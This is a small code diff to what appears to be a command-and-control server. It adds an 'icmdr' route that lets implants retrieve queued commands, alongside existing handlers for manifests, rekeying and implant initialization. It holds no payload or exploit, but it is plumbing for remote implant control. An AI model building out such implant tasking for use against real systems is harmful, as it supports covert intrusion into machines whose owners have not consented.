@@ -6,7 +6,8 @@ destinations = {"lpo": core.send_manifest,
                 "lprk": core.rekey,
                 "rcmd": core.receive_command,
                 "noop": core.noop,
-                "ii": implants.initialize_implant
+                "ii": implants.initialize_implant,
+                "icmdr": core.retrieve_command_for_implant
                 }
 
 
